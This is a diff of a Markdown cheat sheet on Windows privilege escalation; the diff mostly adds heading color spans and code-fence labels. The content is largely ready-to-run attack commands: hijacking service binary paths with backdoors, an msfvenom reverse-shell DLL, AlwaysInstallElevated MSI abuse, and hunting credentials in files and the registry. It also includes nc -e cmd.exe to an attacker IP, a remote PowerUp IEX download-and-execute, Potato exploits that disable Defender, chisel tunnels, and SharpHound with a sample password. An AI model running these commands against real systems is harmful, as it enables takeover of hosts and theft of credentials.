@@ -11,9 +11,9 @@ weight: 100
 toc: true
 ---
 
-## Enumeration
+## <span style="color:#d32e9d">Enumeration
 We need to enumerate for basic information before attempting to escalate privilege.
-```
+```shell
 #Get Windows Version
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 #Get patch Information
@@ -55,7 +55,7 @@ tasklist /SVC
 #Vulnerable Drivers
 driverquery.exe /fo table
 ```
-## Kernel Exploits
+## <span style="color:#d32e9d">Kernel Exploits
 Kernel Exploit could be dangerous. So any kernel exploit should be run if there is no other way to escalate the privilege.
 
 Get System Information and transfer to remote Linux host. This is the command we need to run before we find exploits on Google or Searchsploit:
@@ -75,7 +75,7 @@ Find Exploit in Google and Searchsploit. Example:
 
 * Google> Windows Version Privilege Escalation Exploit
 * Searchsploit> $ searchsploit windows 10
-## Service Exploits
+## <span style="color:#d32e9d">Service Exploits
 If a service improperly configured, it may lead to escalate to higher privilege. 5 way service can be exploited.
 
 1. Insecure Service Permission
@@ -83,7 +83,7 @@ If a service improperly configured, it may lead to escalate to higher privilege.
 1. Insecure Registry Permission
 1. Insecure Service Executable
 1. DLL Hijacking
-### Service Enumeration
+### <span style="color:#d32e9d">Service Enumeration
 We should find out all running services and the version.
 ```
 #cmd
@@ -95,13 +95,13 @@ Get-Service
 #wmic
 wmic service list brief
 ```
-### Listing All Running Services
-```
+### <span style="color:#d32e9d">Listing All Running Services
+```shell
 sc queryex type=service 
 powershell.exe -c "Get-Service | Where-Object {$_.Status -eq "Running"}
 ```
 Search for more info against a suspicious service with this cmd/powershell command
-```
+```python
 sc queryex type=service state=all | find /i "SERVICE_NAME: service_name"
 #or
 powershell.exe -c "Get-Service | Where-Object {$_.Name -like "*service_name*"}
@@ -112,7 +112,7 @@ sc query service_name
 Get-Service service_name
 ```
 Modifying a service binary path
-```
+```shell
 sc config service_name binpath='c:\windows\temp\shell.exe'
 ```
 Start and Stop a Service
@@ -120,53 +120,53 @@ Start and Stop a Service
 net start serv_name
 net stop serv_name
 ```
-### Exploit Insecure Services Permission
+### <span style="color:#d32e9d">Exploit Insecure Services Permission
 We need to find a suspicious service name. If a service running with permission SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS, We can exploit it by changing its binary path.
-```
+```shell
 sc qc service_name
 sc config service_name binpath="c:\windows\temp\backdoor.exe"
 net stop service_name
 net start service_name
 ```
-### Exploiting Unquoted Service Path
+### <span style="color:#d32e9d">Exploiting Unquoted Service Path
 If a service not enclosed within the quote, it may help us to escalate the privilege. Anyone folder of the service path needs to be writable. For example, I found C:\Program Files\Deploy Ready\Service Files\Deploy.exe. In C:\Program Files\ Directory, The “Deploy Ready” and “Service Files” subdirectory is writable. We can exploit this vulnerability to escalate the privilege. How does it work?
 
 1. When starting the service, if it failed to execute Deploy.exe
 1. It will execute C:\Program Files\Deploy Ready\Service.exe
 1. If Service.exe was not found, C:\Program Files\Deploy.exe will be executed!
-#### Find Vulnerability
-```
-#Manually
+#### <span style="color:#d32e9d"> Find Vulnerability
+```shell
+# Manually
 wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
 
-#With winpeas
+# With winpeas
 .\winPEAS.exe quiet servicesinfo
 ```
-#### Test If any directory is writable:
+#### <span style="color:#d32e9d">Test If any directory is writable:
 1. Manually
-```
+```shell
 echo "Test";"C:\Path a\Path b\Path c\test.txt" #no permission denied? We are fine then
 icacls "C:\Path a\Path b\Path c\test.txt" #F=Full, W=Write
 ```
 2. With Accesschk (More efficient)
-```
+```shell
 .\accesschk.exe /accepteula -uwdq C:\
 .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
 .\accesschk.exe /accepteula -uwdq "C:\Program Files\Service Path"
 ```
-#### Exploit
+#### <span style="color:#d32e9d">Exploit
 If we don’t have permission to restart the service we can try to reboot the machine. And if the service configured AUTO_START and run as LocalSystem, we will get a system shell
-```
+```shell
 sc qc "service_name"
 copy \\smb_ip\\Service.exe "C:\Program Files\Deploy Ready\Service.exe"
 net start service_name
 #If unable to start the service try rebooting
 shutdown /r /t 0
 ```
-### Insecure Registry Permission
+### <span style="color:#d32e9d">Insecure Registry Permission
 If we can’t write to a service directory/folder, but can modify or write to registry, we can escalate the privilege.
 
-#### Find Services
+#### <span style="color:#d32e9d">Find Services
 ```
 #Get All Services info
 .\winPEAS.exe quiet servicesinfo
@@ -175,7 +175,7 @@ If we can’t write to a service directory/folder, but can modify or write to re
 .\winPEAS.exe quiet servicesinfo
 reg query hklm\System\CurrentControlSet\Services /s /v imagepath
 ```
-#### Confirm Registry weak permission
+#### <span style="color:#d32e9d">Confirm Registry weak permission
 ```
 #Confirm Weak Permission with Powershell command
 Get-Acl HKLM:\System\CurrentControlSet\Services\SrvName |Format-List
@@ -183,7 +183,7 @@ Get-Acl HKLM:\System\CurrentControlSet\Services\SrvName |Format-List
 #Confirm with accesschk
 .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\SrvName
 ```
-#### Exploit
+#### <span style="color:#d32e9d">Exploit
 If we are confirm that we can modify the registry:
 ```
 #Add Backdoor to the Registry
@@ -191,7 +191,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\srevices\SrvName /v ImagePath /t REG_EXPAN
 #Start the service
 net start SrvName
 ```
-### DLL Hijacking
+### <span style="color:#d32e9d">DLL Hijacking
 If a program or service can’t load a dll file in specified directory, we can supply our own malicious dll for escalation. The DLL loading folder need to be writable!
 
 Check Permission of the Program folder
@@ -204,7 +204,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=attack_IP LPORT=attacker_port 
 ```
 Now Try restart the service or execute the vulnerable program
 
-## Exploit Startup Program
+## <span style="color:#d32e9d">Exploit Startup Program
 We need to copy the accesschk64.exe to remote host to check permission. If a program has FILE_ALL_ACCESS permission, we can exploit it for system shell.
 ```
 accesschk64.exe -wvu “C:\Program Files\Autorun Program”
@@ -215,7 +215,7 @@ We can also get admin session by exploiting startup applications. Check the perm
 icacls.exe “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”
 copy \\smb_ip\bak.exe “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\bak.exe”
 ```
-## Exploiting AlwaysInstallElevated
+## <span style="color:#d32e9d">Exploiting AlwaysInstallElevated
 We need to check if it is enabled. If the value is 0x1, we can exploit it!
 ```
 reg query HKLM\Software\Policies\Microsoft\Windows\Installer
@@ -229,20 +229,20 @@ Copy shell.msi to victim machine using SMB or other way and run:
 ```
 msiexec /quiet /qn /i shell.msi
 ```
-## Exploiting Clear Text password
+## <span style="color:#d32e9d">Exploiting Clear Text password
 If we are in luck we may found password in clear text.
 
-#### Finding WIFI password
+#### <span style="color:#d32e9d">Finding WIFI password
 ```
 netsh wlan show profile
 netsh wlan show profile <SSID> key=clear
 ```
-#### Search Sensitive Files that may have credential
+#### <span style="color:#d32e9d">Search Sensitive Files that may have credential
 ```
 cd C:\
 dir /s/b /A:-D RDCMan.settings == *.rdg == SCClient.exe == *_history == .sudo_as_admin_successful == .profile == *bashrc == httpd.conf == *.plan == .htpasswd == .git-credentials == *.rhosts == hosts.equiv == Dockerfile == docker-compose.yml == appcmd.exe == TypedURLs == TypedURLsTime == History == Bookmarks == Cookies == "Login Data" == places.sqlite == key3.db == key4.db == credentials == credentials.db == access_tokens.db == accessTokens.json == legacy_credentials == azureProfile.json == unattend.txt == access.log == error.log == *.gpg == *.pgp == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12 == *.der == *.csr == *.cer == known_hosts == id_rsa == id_dsa == *.ovpn == anaconda-ks.cfg == hostapd.conf == rsyncd.conf == cesi.conf == supervisord.conf == tomcat-users.xml == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == unattend.xml == unattended.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == groups.xml == services.xml == scheduledtasks.xml == printers.xml == drives.xml == datasources.xml == php.ini == https.conf == https-xampp.conf == httpd.conf == my.ini == my.cnf == access.log == error.log == server.xml == SiteList.xml == ConsoleHost_history.txt == setupinfo == setupinfo.bak 2&gt;nul | findstr /v ".dll"
 ```
-#### Search for “Password"
+#### <span style="color:#d32e9d">Search for “Password"
 ```
 #Search suspicious files from filename
 dir /s /W *pass* == *cred* == *vnc* == *.config* | findstr /i/v "\\windows"
@@ -251,7 +251,7 @@ dir /s /W *pass* == *cred* == *vnc* == *.config* | findstr /i/v "\\windows"
 findstr /D:C:\ /si password *.xml *.ini *.txt #A lot of output can be generated
 findstr /D:C:\ /M /SI password *.xml *.ini *.txt 2&gt;nul | findstr /V /I "\\AppData\\Local \\WinXsX ApnDatabase.xml \\UEV\\InboxTemplates \\Microsoft.Windows.CloudExperienceHost" 2>null
 ```
-#### Search Password in Registry
+#### <span style="color:#d32e9d">Search Password in Registry
 ```
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2&gt;nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
 reg query "HKCU\Software\ORL\WinVNC3\Password"
@@ -265,27 +265,27 @@ reg query "HKCU\Software\OpenSSH\Agent\Key"
 reg query HKLM /f password /t REG_SZ /s #Look for registries that contains "password"
 reg query HKCU /f password /t REG_SZ /s #Look for registries that contains "password"
 ```
-#### Try With Winpeas:
+#### <span style="color:#d32e9d">Try With Winpeas:
 ```
 .\winPEAS.exe quiet filesinfo userinfo
 ```
-## RunAS
+## <span style="color:#d32e9d">RunAS
 Using cmdkey
-```
+```shell
 cmdkey /list
 runas /savecred /user:Administrator "c:\windows\temp\backdoor.exe"
 ```
 By providing credentials
-```
+```shell
 C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
 ```
-## Exploiting Well known Software
+## <span style="color:#d32e9d">Exploiting Well known Software
 Some software installed in the target machine may have public exploit to use. We should google search for a exploit with the version of installed software.
 ```
 tasklist /v 
 .\winpeas.exe quiet processinfo
 ```
-## Schedule Task
+## <span style="color:#d32e9d">Schedule Task
 ```
 #From CMD
 schtasks /query /fo LIST /v
@@ -302,27 +302,27 @@ echo C:\windows\temp\rev.exe>> C:\Tools\Adm.Ps1
 ```
 If everything goes well, we should have shell as system in 10 minutes!
 
-## Dangerous User Privileges
+## <span style="color:#d32e9d">Dangerous User Privileges
 Some privileges for a user is dangerous. They could lead to escalate to higher privilege I will list some of them:
 
-### SEImpersonatePrivilege
+### <span style="color:#d32e9d">SEImpersonatePrivilege
 It can act as any other user, such as, Administrator. The vulnerability could be exploited with **JuicyPotato**
 
-### SeAssignPrimaryPrivilege
+### <span style="color:#d32e9d">SeAssignPrimaryPrivilege
 Assign an access token to new process. Can be exploited with JuicyPotato
 
-### SeBackUpPrivilege
+### <span style="color:#d32e9d">SeBackUpPrivilege
 If a user has this privilege he is able to read files. That’s mean the user can extract password/hash from registry which could be used for pass-the-hash attack
 
-### SeRestorePrivilege
+### <span style="color:#d32e9d">SeRestorePrivilege
 This privilege grant a user to modify service binary, dll, also modify registry settings
 
-### Others risky Privilege
+### <span style="color:#d32e9d">Others risky Privilege
 * SeCreateTokenPrivilege
 * SeLoadDriverPrivilege
 * SeDebugPrivilege
 
-## Hot Potato Exploit
+## <span style="color:#d32e9d">Hot Potato Exploit
 A Tutorial: https://pentestlab.blog/2017/04/13/hot-potato/
 
 Windows 7
@@ -333,34 +333,34 @@ Windows 10
 ```
 .\Potato.exe -ip &lt;local ip> -cmd &lt;cmd to run> -disable_exhaust true -disable_defender true
 ```
-## Juicy Potato
+## <span style="color:#d32e9d">Juicy Potato
 If SeImpersonate/SeAssignPrimaryToken JuicyPotato can be used to escalated privilege.
 
 Note: CLSID can be found in: https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
-```
+```shell
 JuicyPotato.exe -l 4444 -p C:\Windows\Temp\Rev.exe -t * -c {CLS_ID}
 ```
-## Rogue Potato
+## <span style="color:#d32e9d">Rogue Potato
 Just another Windows Local Privilege Escalation from Service Account to System. So the requirement is the accessed account needed to be a service account.
-```
+```shell
 .\RoguePotato.exe -r 192.168.1.11 –l 9999 -e "C:\Windows\Temp\rev.exe
 ```
 
-## Useful Commands
+## <span style="color:#d32e9d">Useful Commands
 
-### PowerUp
-```
+### <span style="color:#d32e9d">PowerUp
+```powershell
 powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.21:8000/PowerUp.ps1'); Invoke-AllChecks"
 ```
-### Port Forwarding
-```
+### <span style="color:#d32e9d">Port Forwarding
+```shell
 chisel server -p 8000 --reverse
 chisel.exe client 10.10.14.3:8000 R:1337:socks
 socks5 127.0.0.1 1337
 proxychains4 nmap 127.0.0.1 -p 8888
 ```
-### BloodHound
-```
+### <span style="color:#d32e9d">BloodHound
+```shell
 impacket-smbserver test $(pwd)
 
 powershell -ep bypass -command "import-module \\10.10.14.7\test\SharpHound.ps1; invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice"
